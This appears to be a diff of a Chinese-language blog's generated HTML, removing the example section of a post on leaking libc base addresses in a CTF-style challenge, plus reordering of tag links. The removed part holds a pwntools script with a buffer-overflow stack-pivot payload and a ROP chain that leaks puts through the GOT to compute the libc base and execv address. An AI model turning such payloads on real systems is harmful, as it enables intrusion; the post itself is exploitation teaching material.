@@ -177,11 +177,7 @@
       
         <h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>这个例题似乎是没法完成最终的getshell的，因为缓冲区离got表太近了，会出问题。</p>
 <h4 id="1-思路"><a href="#1-思路" class="headerlink" title="1.思路"></a>1.思路</h4><p>当程序开了PIE或者ASLR保护后，函数的地址会被<strong>随机化</strong>，这时如果要返回到某个函数的话就需要泄露地址。<br>以开了ASLR的为例，此时系统函数的地址是随机的，但是函数在同一libc中的<strong>偏移量是确定的</strong>。而我们知道，一个系统函数，如puts函数，在程序中被调用过后，其地址就会存在got表中，此时可以通过泄露其地址，再通过偏移即可泄露libc的基地址。此时如果要调用system或execv函数，则再用libc基地址加上对应的偏移即可。</p>
-<h4 id="2-例子"><a href="#2-例子" class="headerlink" title="2.例子"></a>2.例子</h4><p>例题文件：<a href="example2">点击下载</a><br>前略。<br><img src="/2021/10/22/%E6%B5%85%E8%B0%88libc%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2/1.png"><br><img src="/2021/10/22/%E6%B5%85%E8%B0%88libc%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2/2.png"><br><img src="/2021/10/22/%E6%B5%85%E8%B0%88libc%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2/3.png"><br>可以看出，总体的逻辑和之前的advanced差不多，通过栈溢出覆盖返回地址到global_buf，实行栈转移。由于开了NX保护，所以无法通过shellcode的方法。<br>这题不同的是需要先进行地址泄露，脚本的逻辑如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">b&#x27;A&#x27;</span>*<span class="number">80</span>+p64(global_buf_addr)+p64(leave_ret)    <span class="comment">#栈转移</span></span><br><span class="line">payload2=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>    <span class="comment">#抬栈</span></span><br><span class="line">payload2+=p64(global_buf_addr)+p64(pop_rdi_ret)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(main_start_addr)    <span class="comment">#泄露puts地址并返回主函数开头</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;global:&#x27;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;input:&#x27;</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">leak=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))    <span class="comment">#获取puts地址信息</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(leak))    <span class="comment">#打印十六进制地址</span></span><br><span class="line">libc_base=leak-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]    <span class="comment">#利用偏移计算libc基地址</span></span><br><span class="line">execv_addr=libc_base+libc.symbols[<span class="string">&#x27;execv&#x27;</span>]    <span class="comment">#计算execv地址</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(execv_addr))</span><br></pre></td></tr></table></figure>
-<p>之后再构建rop即可getshell。<em>（由于题目本身问题，故没有成功。）</em></p>
-<h4 id="3-小结"><a href="#3-小结" class="headerlink" title="3.小结"></a>3.小结</h4><p>地址泄露的原理很简单，首先要泄露某个函数的地址，根据固定的偏移量计算基地址位置，再根据偏移计算你要调用函数的地址。<br>需要注意的是<strong>libc版本的选择一定要正确</strong>。因为不同的libc同一函数的偏移量都是不一样的。</p>
-
+        
       
 
       
@@ -202,11 +198,11 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">基地址泄露</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ROP</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ROP</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">基地址泄露</a>
         		</li>
       		
 		</ul>
@@ -292,11 +288,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">栈</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">题目</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">题目</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">栈</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
@@ -407,11 +403,11 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ROP</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">解题思路</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">解题思路</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ROP</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
@@ -510,11 +506,11 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ROP</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">解题思路</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">解题思路</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ROP</a>
         		</li>
       		
 		</ul>
@@ -890,11 +886,11 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Assembly</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">栈</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">栈</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Assembly</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
@@ -1320,35 +1316,11 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Linux指令</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">vim</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Python</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Assembly</a>
+                <a href="javascript:void(0)" class="js-tag color3">题目</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">栈</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">数据存储</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">调用约定</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">题目</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1368,6 +1340,30 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">Linux指令</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">vim</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Assembly</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">数据存储</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">调用约定</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">二进制</a>
               </li>
              
@@ -1376,7 +1372,7 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">基地址泄露</a>
+                <a href="javascript:void(0)" class="js-tag color5">解题思路</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1384,7 +1380,7 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">解题思路</a>
+                <a href="javascript:void(0)" class="js-tag color1">基地址泄露</a>
               </li>
              
               <li class="article-tag-list-item">
